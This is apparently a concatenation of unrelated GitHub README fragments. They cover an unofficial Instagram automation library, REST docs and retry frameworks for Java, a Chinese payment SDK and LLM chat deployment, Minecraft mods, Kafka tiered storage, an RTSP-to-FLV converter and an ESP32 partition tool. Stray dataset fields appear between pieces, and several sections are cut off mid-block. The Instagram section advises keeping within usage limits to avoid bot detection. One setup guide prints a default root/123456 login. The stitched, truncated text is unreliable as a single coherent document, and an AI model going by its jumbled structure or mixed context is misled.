-   Supports  **_Realtime direct messages listener_** (Pending)
-   Supports  **Login using cache/saving sessions**
-   Supports  **Posting (Picture)**
-   Supports  **Adding stories (Photo)**
-   Supports  **Following/Unfollowing**
-   Supports  ***Acception/Ignoring follow request*** (Pending)
-   Supports  **Scrapping followings and followers**
-   Supports  **Getting profile data**
-   Supports  **Liking/commenting on post**
-   Supports  **Fetching feeds/timeline post**
-   Supports  **Downloading posts and pfp**

## Implimentation
Due to the outage of jitpack, the library cannot published. Therfore, you have to locally implement it by puting the .jar file in the lib directory.

#### Step 1 : Download the `.jar` from the release section and put it in `lib` folder of your project.

#### Step 2 : declare the dependency
*For gradle*

```groovy
dependencies {
    implementation files('libs/JxInsta-v1.0-beta.jar')
    implementation group: 'com.squareup.okhttp3', name: 'okhttp', version: '5.0.0-alpha.11' //skip if already implemented
}
```

*For maven*

```XML
<dependency>
    <groupId>com.sample</groupId>
    <artifactId>jxinsta</artifactId>
    <version>v1.0-beta-2</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/lib/JxInsta-v1.0-beta-2.jar</systemPath>
</dependency>

<dependency>
    <groupId>com.squareup.okhttp3</groupId>
    <artifactId>okhttp</artifactId>
    <version>5.0.0-alpha.11</version>
</dependency>

```

You can search on Google for more info on including local dependencies.

## FAQ

#### [Q.1] Can we use this library to make bots?

**Answer.** Yes. But Instagram doesn't allow them to make bots with their official graph APIs. Although this is not the official API, you should follow the usage limits to prevent detection.

#### [Q.2] Can we download stories or posts using this library?

**Answer.** Yes, and that too without login

#### [Q.3] Does the use of this library require any tokens or other keys?

**Answer.** No. You only need to have the username and password of the account. You can also log in using cookies and bearer tokens.

#### [Q.4] In Android, can we use Webview to log in?

**Answer.**  Yes, check  [this](https://github.com/ErrorxCode/JxInsta/wiki/Android-users#using-webview-for-login)  example on how to use that

[![Maven Central](https://img.shields.io/maven-central/v/io.github.hejow/easy-restdocs-generator.svg)](https://central.sonatype.com/artifact/io.github.hejow/easy-restdocs-generator)
[![GitHub license](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/Hejow/easy-restdocs-generator/blob/main/LICENSE)

### This is a generator that suggest easier way to use rest-docs.

## Install

- `JDK 17` or higher is required
- `Spring Boot 3.X` is required

### Gradle

```groovy
testImplementation(""io.github.hejow:easy-restdocs-generator:1.0.0"")
```

### Maven

```xml

<dependency>
    <groupId>io.github.hejow</groupId>
    <artifactId>easy-restdocs-generator</artifactId>
    <version>1.0.0</version>
    <scope>test</scope>
</dependency>
```

## How to use

Only you have to do is **Customize tags** and **Use builder**.

### Customize tags

To specify your api, easy-restdoc use `ApiTag` to generate documents.

```java
// example
public enum MyTag implements ApiTag {
  USER(""user api"");

  private final String content;

  // ... constructor

  @Override
  public String getName() {
    return this.content;
  }
}
```

### Use builder

After test with `mockMvc` just use builder to generate as like below.

Planning to support `RestAssured`.

> ### 💡 Tips
>
> To generate documents you MUST put `tag`, `result` on `Builder`.
>
> If you don’t put `identifier` on `Builder`, Method name of the test you wrote will be used as `identifier`
>
> Tests MUST run with rest-docs settings such as
`@ExtendWith(RestDocumentationExtension.class)` ([see here](https://github.com/Hejow/easy-restdocs-generator/blob/f25657a5aa20f813d9814d00b661bf6e11d300dd/sample/src/test/java/com/simplerestdocs/user/UserControllerTest.java#L45))

```java
// example
@Test
void myTest() throws Exception {
  // given

  // when
  var result = mockMvc.perform(...);

  // then
  result.andExpectAll(
    status().isOk(),
    ...
  );

  // docs
  result.andDo(
    Document.builder()
      .identifier(""identifier of your API"") // Can skip
      .tag(MyTag.USER) // Custom tags
      .summary(""this will be name of API"")
      .description(""write description about your API"")
      .result(result) // Test result
      .buildAndGenerate()
  );
}
```

## 🛠️ 业务系统接入
> 业务系统想接入支付网关的话，不需要集成到业务系统里，只需要单独部署一份支付系统，然后业务系统通过接口调用即可拥有对应的支付能力，
不会对原业务系统的架构产生影响。如果是Java项目，可以使用SDK简化接入流程， 其他语言可以参照中的说明使用HTTP接口方式接入。

### Java客户端SDK
> SDK版本号与支付网关的版本保持一致，如果需要使用，请在pom.xml中添加如下依赖。SDK使用方式参考[SDK使用说明](https://doc.daxpay.cn/single/gateway/overview/SDK使用说明.html)。

```xml
 <!-- 支付SDK -->
<dependency>
    <groupId>cn.daxpay.single</groupId>
    <artifactId>daxpay-single-sdk</artifactId>
    <version>${latest.version}</version>

Docker 和 Docker Compose。

### 使用 Docker Compose 部署

1. 进入项目 [`deploy`](./deploy) 目录，打开 [`application.env`](./deploy/application.env) 文件，填写 `邮箱 SMTP`、`机器人配置`、`Bing Search Key` 等基础配置项。

配置示例：

```sh
##########################################
#         基础配置【必填】                  #
##########################################
###### SMTP 配置  ######
SMTP_SEND_MAIL=

###### SMTP 的授权码  ######
SMTP_PASSWORD=
### 机器人的模型名字配置
#chat line 的模型配置
#CHAT_LITE_MODEL_NAME=gpt-3.5-turbo-16k-0613
CHAT_LITE_MODEL_NAME=
# 请求模型的最大token 数，非gpt的会使用cl100k_base编码进行token计算,如果最大的 token数少于6000 会也会自动关闭PDF阅读和阅读全文
#CHAT_LITE_REQUEST_TOKEN=12000
CHAT_LITE_REQUEST_TOKEN=
# chat pro 的模型配置
#CHAT_PRO_MODE_NAME=gpt-4-0613
CHAT_PRO_MODE_NAME=
# 请求模型的最大token 数，非gpt的会使用cl100k_base编码进行token计算,如果最大的 token数少于6000 会也会自动关闭PDF阅读和阅读全文
#CHAT_PRO_REQUEST_TOKEN=4000
CHAT_PRO_REQUEST_TOKEN=

### chat line 和 chat pro 的联网检索配置
#chat line的模型是否支持function call,这和BING_SUBSCRIPTION_KEY 共同决定是否开启联网检索（是否为true）
# true 和 BING_SUBSCRIPTION_KEY 不为空 则可以自动开通chat line  的联网检索
CHAT_LITE_FUNCTION_CALL=true
#chat pro的模型是否支持function call,这和BING_SUBSCRIPTION_KEY 共同决定是否开启联网检索（是否为true）
# true 和 BING_SUBSCRIPTION_KEY 不为空 则可以自动开通chat pro  的联网检索
CHAT_PRO_FUNCTION_CALL=true
######bing 检索的配置【非必填】######

EMBEDDING_MODEL_NAME=
```

2. 使用 Docker Compose 启动项目

 ```sh
docker compose up -d
 ```

### 配置大模型网关

目前，关于大型模型的访问和管理，采用了一个名为[one-api](https://github.com/songquanpeng/one-api)的解决方案。这个项目允许用户通过一个统一和标准化的OpenAI API格式来访问所有的大型模型，非常方便用户开箱即用。若想深入了解该项目的具体信息和使用说明，强烈建议参阅项目的官方文档，可以通过点击此链接[one-api](https://github.com/songquanpeng/one-api)访问。

对于想要开始使用one-api的用户来说，非常简单。
首先，访问地址是：http://localhost:3000/。 在首次使用时，你将需要使用初始账户名`root`以及密码`123456`进行登录。

在登录之后，重要的一步是配置one-api来接入所需的大型模型渠道。此步骤对于确保您能正常使用`Samepage`非常重要。


**模型校验和配置**

**校验步骤：**

检查 `conf.json` 文件中是否存在与您在 One-API 中配置的模型相对应的模型。

**如果模型不存在，请按照以下步骤添加：**

1. 打开 `backend/management-service/src/main/resources/conf.json` 文件。
2. 添加以下格式的模型列表：
```json
  {
   ""modelName"": ""one-api 配置的模型名"",
   ""name"": ""前端展示的名字"",
   ""maxRequestToken"": 4000,
   ""functionCall"": false
}
```
3. **保存**更改的文件。
4. 在项目目录下执行以下命令重新打包：

```shell
docker build -t samepaage/samepage-api:main -f ./backend/management-service/Dockerfile .
```



### 开始使用

Web 访问地址：http://localhost
移动端访问地址：http://localhost/m-chat

#### 浏览器插件配置

浏览器插件配置的接口地址： http://localhost/api/
浏览器插件配置的web端地址：http://localhost/

findhumane/react-native-threaded-downloader,main,"# react-native-threaded-downloader

Perform HTTP requests on separate native asynchronous threads and then call back to a promise.

## Installation

```sh
npm install react-native-threaded-downloader
```

## Usage

```js
import { performThreadedDownload } from 'react-native-threaded-downloader';

// First argument is the URL and second argument is the timeout in seconds
performThreadedDownload(""https://example.com/"", 60)
  .then((response) => console.log(response))
  .catch((e) => console.dir(e));
```

See [the example](example/src/App.tsx) for details.

## How it works

When `performThreadedDownload` is called:

* [On iOS](ios/ThreadedDownloader.mm), a task is executed on a [dispatch queue](https://developer.apple.com/documentation/dispatch/1453030-dispatch_queue_create) of type `DISPATCH_QUEUE_CONCURRENT`.
* [On Android](android/src/main/java/com/threadeddownloader/ThreadedDownloaderModule.java), a [`Runnable`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Runnable.html) is executed on a thread pool of up to 10 native threads.

JustAlittleWolf/ModDetectionPreventer,1.20.4,"<h1 style=""text-align: center"">Mod Detection Preventer</h1>

⚠️ For now please stop using this mod. Another method of detecting mods has been found, and I am not able to resolve it at this time. Using this mod might cause you to get banned. ⚠️

<p align=""center"">
<img src=""src/main/resources/assets/moddetectionpreventer/icon.png"">
</p>

<p style=""text-align: center"">A simple mod that prevents a security vulnerability allowing servers to detect which mods are installed on
the client side.</p>


**While I try my best to keep this mod up to date, server admins might find a new method to access your mods-list. It is always recommended that you follow the server rules.**

## The Vulnerability

Minecraft has a feature that allows text (in chat, on signs, or in the bossbar) to be specified by a keybind the user
has set, or a translation key. The Client will then replace the translation key, or the keybind with the stored value.
This can be abused by the server by serving the client a sign with such a placeholder (for example Sodium:
`sodium.option_impact.low`). By immediately closing the sign screen, the client sends the edited text to the server
without ever seeing a sign open screen. The server can then detect wether you have that specific mod installed, by
checking if your client replaced the placeholder with the corresponding text (`sodium.option_impact.low -> Low`). If
you don't have Sodium installed, the placeholder will stay there
(`sodium.option_impact.low -> sodium.option_impact.low`).

This also works on the Anvil screen. The server could prompt you to open the anvil screen, with an item in the
renaming slot that has a translation key as it's name. The client would then rename the item to the corresponding
value and send an update to the server. (Huge thanks to Frog, `@croaak` on discord, for figuring this out)

This detection method works for any mod that has custom translations.

## The Fix

This mod fixes this issue by simply not resolving any translation or keybind placeholders on signs, except vanilla
ones. This makes it impossible for the server to use this method to detect installed mods.

To verify this works you can test it in a [test world](https://github.com/JustAlittleWolf/ModDetectionPreventer/raw/1.20.4/testWorld.zip).

## Intentions

~~While this feature can be used to prevent harm by detecting cheaters early, it is implemented improperly on some
servers, including [Cytooxien](CytooxienDetectedMods.md). Immediately banning players upon joining, simply because they
have tweakeroo installed, is unacceptable.~~
After a discussion with the developer of Cytooxien, they told me that players won't get banned for using tweakeroo, only kicked repeatedly.

pinterest/tiered-storage,main,"# Pinterest Tiered Storage for Apache Kafka®
Pinterest Tiered Storage for [Apache Kafka®](https://kafka.apache.org/) is a broker-independent framework that allows brokers
to offload finalized log segments to a remote storage system. 
This allows Apache Kafka® to maintain a smaller disk footprint and reduce the need for expensive storage on the brokers. 
The framework also provides a consumer client that can consume from both the broker and the remote storage system.

Pinterest's implementation of Tiered Storage for Apache Kafka® provides a ***broker-independent*** approach to Tiered Storage.
***See the differences between [Pinterest vs. Apache Kafka® Tiered Storage](#pinterest-vs-apache-kafka-tiered-storage)***.

It consists of two main components:
1. [Uploader](ts-segment-uploader): A continuous process that runs on each Apache Kafka® broker and uploads finalized log segments to a remote storage system (e.g. Amazon S3, with unique prefix per cluster and topic).
2. [Consumer](ts-consumer): A consumer client capable of consuming from both Tiered Storage log segments and Apache Kafka® cluster.

A third module [ts-common](ts-common) contains common classes and interfaces that are used by the `ts-consumer` and `ts-segment-uploader` modules, such as Metrics, StorageEndpointProvider, etc.

Feel free to read into each module's README for more details.

# Why Tiered Storage?
[Apache Kafka®](https://kafka.apache.org/) is a distributed event streaming platform that stores partitioned and replicated log segments on disk for
a configurable retention period. However, as data volume and/or retention periods grow, the disk footprint of Apache Kafka® clusters can become expensive. 
Tiered Storage allows brokers to offload finalized log segments to a more cost-effective remote storage system, reducing the need for expensive storage on the brokers.

With Tiered Storage, you can:
1. Maintain a smaller overall broker footprint, reducing operational costs
2. Retain data for longer periods of time while avoiding horizontal and vertical scaling of Apache Kafka® clusters
3. Reduce CPU, network, and disk I/O utilization on brokers by reading directly from remote storage

## Pinterest vs. Apache Kafka® Tiered Storage
### Apache Kafka® Tiered Storage
[KIP-405](https://cwiki.apache.org/confluence/display/KAFKA/KIP-405%3A+Kafka+Tiered+Storage?uclick_id=11f222c6-967b-4935-98a9-cc88aafad7f5)
provides a native, open-source offering to Tiered Storage for Apache Kafka® and is available starting from Apache Kafka® 3.6.0.
The native Tiered Storage implementation is broker-dependent, meaning that the broker process itself is responsible 
for offloading finalized log segments to remote storage, and the ***broker is always in the critical path of consumption***.

### Pinterest Tiered Storage: Skip the broker
***Pinterest's implementation of Tiered Storage is broker-independent***, meaning that the Tiered Storage process runs as a separate process alongside the Apache Kafka® server process,
***and the broker is not always in the critical path of consumption***.
This allows for more flexibility in adopting Tiered Storage, and better accommodates unpredictable consumption patterns. 
Some of the key advantages of a broker-independent approach are:

1. **You don't need to upgrade brokers**: While the native offering requires upgrading brokers to a version that supports Tiered Storage, a broker-independent approach does not.
2. **You can skip the broker entirely during consumption**: When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for more
unpredictable spikes in consumption patterns without affecting the broker. See [MemQ](https://github.com/pinterest/memq) for a PubSub system that uses this approach natively.
3. **Support consumer backfills and replays without affecting broker CPU**: When the broker is out of the critical path of consumption,
consumer backfills and replays can be done without needing to keep additional CPU buffer on the brokers just to support those surges.
4. **Avoid cross-AZ transfer costs**: While the native approach adds a cross-AZ network cost factor for consumers that are not AZ-aware,
this broker-independent approach avoids that cost for all consumers when reading directly from remote storage.
5. **Faster adoption, iteration, and improvements**: A broker-independent Tiered Storage solution lets you adopt and upgrade Tiered Storage without
waiting for Apache Kafka® upgrades. Improvements, bug fixes, and new features are released independently of Apache Kafka® releases.

# Highlights
- **Broker Independent**: The tiered storage solution is designed to be broker-independent. [Here's why we think it's better](#pinterest-tiered-storage-for-apache-kafka).
- **Skip the broker entirely during consumption**: The consumer can read from both broker and Tiered Storage backend filesystem. When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for reduction in broker resource utilization.
- **Pluggable Storage Backends**: The framework is designed to be backend-agnostic.
- **S3 Partitioning**: Prefix-entropy (salting) is configurable out-of-the-box to allow for prefix-partitioned S3 buckets, allowing for better scalability by avoiding request rate hotspots.
- **Fault Tolerant**: Broker restarts, replacements, leadership changes, and other common Apache Kafka® operations / issues are handled gracefully.
- **Metrics**: Comprehensive metrics are provided out-of-the-box for monitoring and alerting purposes.

# Quick Start
Detailed quickstart instructions are available [here](docs/quickstart.md).

# Usage
Using Pinterest Tiered Storage for Apache Kafka® consists of the following high-level steps:
1. Have a remote storage system ready to accept reads and writes of log segments (e.g. Amazon S3 bucket)
2. Configure and start [ts-segment-uploader](ts-segment-uploader) on each Apache Kafka® broker
3. Use [ts-consumer](ts-consumer) to read from either the broker or the remote storage system
4. Monitor and manage the tiered storage system using the provided metrics and tools

Feel free to read into each module's README for more details.

This is a one-to-one replica of the [ender relay concept](https://www.youtube.com/watch?v=L1i4izl25V4) a youtuber by the name of Kenadian made.

The resources for the block were provided by Kenadian.

The Ender Relay is a block that can only be used in the end, it is crafted with a lodestone compass and can be charged like a respawn anchor, instead with a end crystal. When a player clicks the block, it teleports to the lodestone compasses location, ontop of the lodestone.

This completes the trilogy of the bed, respawn anchor by introducing a transportation item for the end dimension.

# What is this?
Fast-Retry是一个高性能任务重试框架，支持百万级别任务的并发重试处理。
与主流的Spring-Retry, Guava-Retry等同步重试框架不同，Fast-Retry是一个支持异步重试框架，支持异步任务的重试、超时等待、回调。
Spring-Retry, Guava-Retry均无法支持大批量任务的重试，因为会占用过多线程资源导致大量任务在等待处理，随着任务数的增加，系统吞吐量大大降低，性能指数级降低，Fast-Retry的性能是前者的指数倍。

下图是三者的性能对比

- 测试线程池:  8个固定线程
- 单个任务逻辑:  轮询5次，隔2秒重试一次，总耗时10秒
- 未测预计公式：  当我们使用线程池的时候， 一般线程池中 总任务处理耗时 =  任务数/并发度 x 单个任务重试耗时


| 任务数  | FastRetry |    Spring-Retry     |     Guava-Retry     |
| :-----: | :-------: | :-----------------: | :-----------------: |
|    1    |   10秒    |        10秒         |        10秒         |
|   10    | 10.066秒  |      20.092秒       |      20.078秒       |
|   50    | 10.061秒  |      70.186秒       |      70.168秒       |
|   100   | 10.077秒  |      130.33秒       |      130.31秒       |
|   500   | 10.154秒  |      631.420秒      |      631.53秒       |
|  1000   | 10.237秒  |      1254.78秒      |      1256.28秒      |
|  5000   | 10.482秒  |  没测预计：6250秒   |  没测预计：6250秒   |
|  10000  | 10.686秒  |  没测预计：12520秒  |  没测预计：12520秒  |
| 100000  |  13.71秒  | 没测预计：125000秒  | 没测预计：125000秒  |
| 500000  |  28.89秒  | 没测预计：625000秒  | 没测预计：625000秒  |
| 1000000 |  58.05秒  | 没测预计：1250000秒 | 没测预计：1250000秒 |


可以看到即使是处理100万个任务，Fast-Retry的性能也比Spring-Retry和Guava-Retry处理在50个任务时的性能还要快的多的多，
这么快的秘密在于除了是异步，更重要是当别人在重试间隔里休息的时候，Fast-Retry还在不停忙命的工作着。

## 引入依赖
```xml
    <dependency>
        <groupId>io.github.burukeyou</groupId>
        <artifactId>fast-retry-all</artifactId>
        <version>0.2.0</version>
    </dependency>
```

# 快速开始
有以下三种方式去构建我们的重试任务

## 1、使用重试队列
```java
        ExecutorService executorService = Executors.newFixedThreadPool(8);
        RetryQueue queue = new FastRetryQueue(executorService);
        RetryTask<String> task = new RetryTask<String>() {
            int result = 0 ;
            @Override
            public long waitRetryTime() {
                return 2000;
            }

            @Override
            public boolean retry() {
                return ++result < 5;
            }

            @Override
            public String getResult() {
                return  result + """";
            }
        };
        CompletableFuture<String> future = queue.submit(task);
        log.info(""任务结束 结果:{}"",future.get());
```

## 2、使用FastRetryBuilder

```java
        RetryResultPolicy<String> resultPolicy = result -> result.equals(""444"");
        FastRetryer<String> retryer = FastRetryBuilder.<String>builder()
                .attemptMaxTimes(3)
                .waitRetryTime(3, TimeUnit.SECONDS)
                .retryIfException(true)
                .retryIfExceptionOfType(TimeoutException.class)
                .exceptionRecover(true)
                .resultPolicy(resultPolicy)
                .build();

        CompletableFuture<String> future = retryer.submit(() -> {
            log.info(""重试"");
            //throw new Exception(""test"");
            //int i = 1/0;
            if (0 < 10){
                throw new TimeoutException(""test"");
            }
            return ""444"";
        });

        String o = future.get();
        log.info(""结果{}"", o);
```

## 3、使用FastRetry注解
- 依赖Spring环境，所以需要在配置上加上@EnableFastRetry注解启用配置才生效
- 如果将结果类型使用CompletableFuture包装，自动进行异步轮询返回，否则同步阻塞等待重试结果。 

下面定义等价于 FastRetryer.execute方法
```
    @FastRetry(retryWait = @RetryWait(delay = 2))
    public String retryTask(){
        return ""success"";
    }
``` 

下面定义等价于 FastRetryer.submit方法,支持异步轮询
```
    @FastRetry(retryWait = @RetryWait(delay = 2))
    public CompletableFuture<String> retryTask(){
        return CompletableFuture.completedFuture(""success"");
    }
```

Apply Fluent Design materials to the Minecraft window.

![acrylicraft-cover](cover.png)

## System Requirement

Fluent design materials, dark mode, and border customization are exclusive to **Windows 11 Version 22H2** (OS build 22621) or later. However, you can still utilize this mod on other operating systems to get the window background transparent, and then use other tools (e.g., [Blur My Shell](https://extensions.gnome.org/extension/3193/blur-my-shell/) for GNOME) for further customizations.

## Mod Dependencies

Acrylic depends on [YetAnotherConfigLib](https://modrinth.com/mod/yacl) as its configuration library. Additionally, you will need [Mod Menu](https://modrinth.com/mod/modmenu) placed in your mods folder to access mod config if using Fabric.

For Forge/NeoForge 1.20 and later, it is also necessary to disable the FML splash screen for the translucent game window to be properly initialized. This can be done by setting `earlyWindowControl` in `.minecraft\config\fml.toml` to `false`. Note that this MIGHT lead to malfunctions for some rendering mods that leverage advanced OpenGL features, so proceed at your own risk.

## Known Issues

Some NVIDIA graphics cards don't render translucency properly for Minecraft's window (or any other GLFW window), in which case the window background would appear black. This is likely an issue with their drivers and is unfortunately not solveable on my end. Switching to another graphics card should make it work, if you happen to have one installed on your machine.

🪶Lightweight Builder generator for Java

## Why Bob?

Bob serves as a lightweight alternative to Lombok's `@Builder` annotation with additional 
features such as the ability to create Step Builders.

## Installation
### Maven
```xml
<dependency>
    <groupId>io.jonasg</groupId>
    <artifactId>bob-annotations</artifactId>
    <version>${bob.version}</version>
    <scope>compile</scope>
</dependency>
<dependency>
    <groupId>io.jonasg</groupId>
    <artifactId>bob-processor</artifactId>
    <version>${bob.version}</version>
    <scope>provided</scope>
</dependency>
```
### Gradle
```groovy
dependencies {
  annotationProcessor ""io.jonasg:bob-processor:"" + bobVersion
  compileOnly ""io.jonasg:bob-annotations:"" + bobVersion
}
```

## Getting Started

Annotate the class with `@Buildable` to generate a builder for it.
    
```java
package my.garage;

@Buildable
public class Car {
	
    private Brand brand;
    private String color;
    private BigDecimal price;
	
    public Car(Brand brand, String color, BigDecimal price) {
        this.brand = brand;
        this.color = color;
        this.price = price;
    }
}
```

## Usage

### Basic Usage

By default,
Bob will look for the constructor with the most parameters
and will create setters for all parameters that have a matching field name. 
For parameters
that do not have a corresponding field, the default value for that type will be used.
In example `null` for `Integer` and zero for `int`.

If your class contains multiple constructors that tie for having the most parameters,
the first one will be selected. 
See `@Buildable.Constructor` if you want to change this behavior.

```java
@Buildable
public class Car {
    private String color;
    private BigDecimal price;
    
    public Car(Brand brand, int year, String color, BigDecimal price) {
        this.color = color;
        this.price = price;
    }
    
}
```

When building a car instance in this way `new CarBuilder().color(""red"").price(BigDecimal.ZERO).build();`
The car will be instantiated with the following constructor call:

```java
new Car(null, 0, ""red"", BigDecimal.ZERO);
```

Because `brand` and `year` aren't fields the default value for the corresponding types are used.


### Different constructor

If you want to use a different constructor instead of the default selected one, annotated it with `@Buildable.Constructor`

### Builder Strategies

The Strategy enumeration defines the strategies by which builders behave.

#### Permissive

The default strategy,
allows the creation of an object
even if not all constructor parameters are set or if some are set to null.
Fields not explicitly set will default to their inherent values
(e.g., null for object references, 0 for numeric types, and false for booleans).
This strategy is suitable when not all fields need explicit initialization,
allowing more flexibility.

```java
@Buildable
class Car {
```

#### Step Wise

Implements a step builder pattern,
requiring fields
to be set in a structured sequence
defined by the selected constructor's parameters and explicitly marked mandatory fields
(see [Mandatory Fields](#Mandatory-Fields)).
Each step must be completed before proceeding to the next,
ensuring all fields are set before the object can be constructed.

```java
@Buildable(strategy = STEP_WISE)
class Car {
```

#### Strict
Requires all mandatory fields to be explicitly set.
If a field is not set,
or is set to null, the builder throws a `MandatoryFieldMissingException`.
This ensures that the object is fully initialized.

```java
@Buildable(strategy = STRICT)
class Car {
```

#### Allow Nulls
Enables setting mandatory fields to null explicitly,
combinable with `STRICT` and `STEP_WISE`.
If a field is omitted, the builder will throw a `MandatoryFieldMissingException`,
maintaining strict initialization but allowing null values for flexibility.

```java
@Buildable(strategy = { STRICT, ALLOW_NULLS })
class Car {
```
### Mandatory Fields

Fields can be marked as mandatory;
- through the `mandatoryFields` property of `@Buildable`
- through annotating the field with @Buildable.Mandatory.
 
Similar to the constructor parameters in the ENFORCED mode,
the omission of these required fields when building an object will trigger a MandatoryFieldMissingException.
This mechanism ensures that all necessary fields are set before an object is finalized.

```java
@Buildable(mandatoryFields = {""color""})
public class Car {
    private String color;
```

```java
@Buildable
public class Car {
    @Buildable.Mandatory
    private String color;
```
### Change Default Package
    
A `CarBuilder` class will be generated in the same package as the source class with *builder* as suffix.
For the car example this will be `my.garage.CarBuilder`

The location of the builder can be changed:

```java
@Buildable(packageName = ""my.other.garage"")
public class Car {
```

### Static Factory Method name

The `factoryName` `@Buildable` property allows:
- `STEP_WISE`: Rename builder starting method (e.g., builder to createProductBuilder).
- `PERMISSIVE/STRICT`: Add extra name to static factory method (for documentation/avoid conflicts).

```java
@Buildable(strategy = STEP_WISE, factoryName = ""car"")
public class Car {
```
Which will generate:
```java
CarBuilder.car();
```

### Pickup setter methods as buildable

When Bob encounters setters (with or without the set prefix)
and a corresponding field it will add the fields to the final builder.

In the below example,
if though `color` is not part of the constructor it will be part of the final generated Builder
because there is a setter available, which will be used.

```java
@Buildable
public class Car {
    private Brand brand;
    private String color;

    public Car(Brand brand) {
        this.brand = brand;
    }
	
    public void color(String color) {
        this.color = color;
    }
}
```
            
### Field exclusion

```java
@Buildable(excludeFields = {""brand"", ""color""})
public class Car {
```

### Setter prefix
      
By default Bob will generated setter methods consisting out of *new style setters* (`name(String name)` instead of `setName(String name)` or the default builder pattern setter style `withName(String name)`)
If you want to change the prefix of those setter methods you can:

```java
@Buildable(setterPrefix = ""with"")
public class Car {
```

### Records

Bob can work with Records and function just as normal java classes

```java
@Buildable
public record Record(String name, int age) {
}
```

### Generics

Bob is not afraid of generics

```java
@Buildable
public class Cup<T, R extends String> {
    private T contents;
    private R topping;
```

Can be used as:
    
```java
Cup<BigDecimal, String> string = new CupBuilder<BigDecimal, String>().topping(""cream"")
    .contents(BigDecimal.ZERO)
    .build();
```

or alternatively:

```java
CupBuilder.of(BigDecimal.class, String.class)
    .topping(""cream"")
    .contents(BigDecimal.ZERO)
    .build();
```

## 📄 Screenshots
Below are screenshots of Easy-FLV in action:

![img_1.png](img_1.png)
![img.png](img.png)

## 🚀 Quick Start

### Add Maven Dependency
Include the following Maven dependency in your Spring Boot project:

```xml
<dependency>
    <groupId>io.github.javpower</groupId>
    <artifactId>rtsp-converter-flv-spring-boot-starter</artifactId>
    <version>1.5.9.1</version>
</dependency>
```

### Implement Interface
Create a service class that implements the `IOpenFLVService` interface to provide the stream address:

```java
@Service
public class RtspDataService implements IOpenFLVService {

    @Override
    public String getUrl(Integer channel) {
        // Retrieve the RTSP stream address based on the channel
        return ""rtsp://10.11.9.251:554/openUrl/16HV8mA"";
    }
}
```

### Configure YAML
Configure Easy-FLV in your `application.yml`:

```yaml
easy:
  flv:
    host: http://localhost:8200
```

### Use Interface
To get the converted stream address and play it in a browser:

- Conversion URL: `GET http://ip:port/get/flv/hls/stream_{channel}.flv`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream_{channel}.flv`

### Direct Usage
If you prefer not to implement an interface, you can directly encode the stream address and convert it:

```java
public static void main(String[] args) throws UnsupportedEncodingException {
    String url = ""rtsp://XXXXXXXX"";
    String encodedUrl = java.net.URLEncoder.encode(url, ""UTF-8"");
    System.out.println(""Encoded Stream URL: "" + encodedUrl);
}
```

- Conversion URL: `GET http://ip:port/get/flv/hls/stream?url=EncodedAddress`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream?url=EncodedAddress`

# Liferay Client Extensions Samples

Automatically mirror official client extensions samples you can find in the main repo here: https://github.com/liferay/liferay-portal/tree/master/workspaces/liferay-sample-workspace/client-extensions

The goal of this repository is to ease the process of trying out client extensions samples by removing the burden of cloning liferay-portal & by renaming ambiguous client extensions (e.g. `custom-element-1`).

The official readme file for those samples is mirrored in the [HOW-TO.md](HOW-TO.md).

The new naming is an arbitrary choice based on the description provided by Liferay in the readme file. Here's the correspondance for the renamed client extensions:

| **Original name** | **New name**                                                 |

## Aditional information

If the build fails because of the Node version, you can force the use of a specific version by changing the build.gradle with something like:

```gradle
apply plugin: ""com.liferay.node""

node {
	nodeVersion = ""20.10.0""
	global = false
}
```
> Note that you can apply this for a specific client extension or all client extensions if you change the value in the parent folder (`client-extensions` or your liferay workpace).",0,0,1,mit,0.0

## Building the Tool

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/serifpersia/esp32partitiontool.git
   cd esp32partitiontool
   ```
## Run the Build Script

- On **Unix-based systems** (Linux, macOS):
  ```
    python3 build_tool.py
- On **Windows**:
  ```
    python build_tool.py
  ```

## Installation (Arduino IDE)
- Download the tool from releases or build it yourself.
- In your Arduino sketchbook directory, create tools directory if it doesn't exist yet.
- Unpack the tool into tools directory (the path will look like `<home_dir>/Arduino/tools/ESP32PartitionTool/tool/ESP32PartitionTool.jar`).
- Restart Arduino IDE

## Usage (Arduino IDE)
- Select Tools > ESP32 Partition Tool menu item.
- Customize partition scheme.
- Export the custom partitions CSV file to sketch directory.
- Select Tools > Partition Scheme & select `Huge App (3MB APP/NO OTA/1MB SPIFFS)`*this will tell Arduino IDE to use our custom partitions.csv file that's located in sketch directory(export csv via the the tool first).
- Close and open the tool to automatically load csv located at the sketch directory or load csv manually with import csv button.
- Configure Flash size and use the uploading buttons. Upload SPIFFS for filesystem spiffs binary, Upload Merge for uploading all binaries or Merge binary for just creating the merge binary file.
* Merged binary can only be uploaded to ESP32 boards via serial ports, OTA uploading is not supported, spiffs upload is supported for uploading over OTA.

## Installation (Platformio)

- Install Java and make sure the executable is in the path
- Create a `partition_manager.py` in your project folder

#### partition_manager.py

```python
Import('env')
import os.path
import sys

# add esp32partitiontool to path
sys.path.append(os.path.abspath( env.PioPlatform().get_package_dir(""tool-esp32partitiontool"") ))
# import module
from esp32partitiontool import *
# run module
load_pm(env)
```

- To launch the GUI, both `extra_scripts` and `platform_packages` entries must be set

#### platformio.ini

```ini
[platformio]
src_dir = src
default_envs = hello-world

[env]
framework = arduino
platform = espressif32
board = esp32dev
; register the ""tool-esp32partitiontool""
; remove url if you have own built tool in pacakges directory of platformio core directory
platform_packages = tool-esp32partitiontool @ https://github.com/serifpersia/esp32partitiontool/releases/download/v1.4.4/esp32partitiontool-platformio.zip
; register the ""edit_partition"" target
extra_scripts = partition_manager.py

[env:hello-world]
board_build.partitions = partitions/default.csv
board_upload.flash_size = 4MB
upload_speed = 1500000


```

- If building the plugin from source, remove the URL from the `platform_packages` entry ...

```ini
platform_packages      = tool-esp32partitiontool
```

- ... and use `pio pkg` to install the plugin from the root of your platformio project:

```shell
pio pkg install -e build-partition --no-save --tool /path/to/esp32partitiontool/esp32partitiontool-platformio.zip --force
```


## Usage (Platformio)

- If building from vsCode: run  ESP32 Partition Tool Task
- If building from a shell : `pio run -t edit_partition -e your_environment`

# spring-data-eclipse-store

